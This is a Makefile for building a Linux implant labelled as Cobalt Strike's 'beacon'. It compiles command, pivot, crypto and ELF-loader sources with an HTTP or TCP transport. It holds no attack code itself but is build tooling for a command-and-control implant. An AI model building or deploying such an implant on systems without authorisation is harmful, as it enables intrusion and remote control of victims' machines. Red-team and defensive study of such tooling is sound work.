# Makefile for Cobalt Strike Linux Implant

OUTPUT ?= beacon

CC = gcc
CFLAGS = -Wall -Wextra -O2 \
         -I./headers \
         -I./generated \
         -I./elfloader/elfloader-headers

LDFLAGS = -lssl -lcrypto

# Homebrew path resolution for macOS builds
ifeq ($(shell uname),Darwin)
    OPENSSL_PREFIX = $(shell brew --prefix openssl@3)
    CURL_PREFIX = $(shell brew --prefix curl)
    CFLAGS += -I$(OPENSSL_PREFIX)/include -I$(CURL_PREFIX)/include
    LDFLAGS += -L$(OPENSSL_PREFIX)/lib -L$(CURL_PREFIX)/lib
endif

# Directories
SRC_DIR            = src
ELFLOADER_SRC_DIR  = elfloader/elfloader-src
INC_DIR            = headers
ELFLOADER_INC_DIR  = elfloader/elfloader-headers
OBJ_DIR            = obj
BIN_DIR            = bin

# Transport selection
TRANSPORT ?= http
ifeq ($(TRANSPORT),http)
    TRANSPORT_SRC = $(SRC_DIR)/http.c
    CFLAGS += -DTRANSPORT_HTTP
    LDFLAGS += -lcurl
else ifeq ($(TRANSPORT),tcp)
    TRANSPORT_SRC = $(SRC_DIR)/tcp.c
    CFLAGS += -DTRANSPORT_TCP
else
    $(error Invalid TRANSPORT type: $(TRANSPORT). Use 'http' or 'tcp')
endif

# Target binary
TARGET = $(BIN_DIR)/$(OUTPUT)
MAKEFILE_DIR := $(dir $(abspath $(lastword $(MAKEFILE_LIST))))
TEST_DIR := $(MAKEFILE_DIR)tests

# Source files
SOURCES = \
    $(SRC_DIR)/beacon.c \
    $(SRC_DIR)/commands.c \
    $(SRC_DIR)/crypto.c \
    $(SRC_DIR)/files.c \
    $(SRC_DIR)/main.c \
    $(SRC_DIR)/pivot.c \
    $(SRC_DIR)/profile.c \
    $(TRANSPORT_SRC) \
    $(wildcard $(ELFLOADER_SRC_DIR)/*.c)

# Object files (mirror source tree in obj/)
OBJECTS = $(patsubst %.c,$(OBJ_DIR)/%.o,$(SOURCES))

# Transport stamp to force recompilation when TRANSPORT changes
TRANSPORT_STAMP = $(OBJ_DIR)/.transport_$(TRANSPORT)

# Default target
all: directories $(TRANSPORT_STAMP) $(TARGET)

# Create necessary directories
directories:
	@mkdir -p $(BIN_DIR)
	@mkdir -p $(OBJ_DIR)/$(SRC_DIR)
	@mkdir -p $(OBJ_DIR)/$(ELFLOADER_SRC_DIR)
	@mkdir -p generated

# Rule for transport stamp
$(TRANSPORT_STAMP):
	@rm -f $(OBJ_DIR)/.transport_*
	@touch $@

# Link the final binary
$(TARGET): $(OBJECTS)
	@echo "[LD] Linking $@"
	@$(CC) $(OBJECTS) -o $@ $(LDFLAGS)
	@echo "[+] Build complete: $@"

# Compile source files (works for all source dirs)
$(OBJ_DIR)/%.o: %.c $(TRANSPORT_STAMP)
	@echo "[CC] Compiling $<"
	@$(CC) $(CFLAGS) -c $< -o $@

# Clean build artifacts
clean:
	@echo "[CLEAN] Removing build artifacts and generated headers"
	@rm -rf $(OBJ_DIR) $(BIN_DIR) generated/*
	@touch generated/.gitkeep

# Debug build
debug: CFLAGS += -g -DDEBUG
debug: clean all

test-quick:
	@bash $(TEST_DIR)/run_regression.sh --mode quick

test-full:
	@bash $(TEST_DIR)/run_regression.sh --mode full

.PHONY: all clean debug directories test-quick test-full
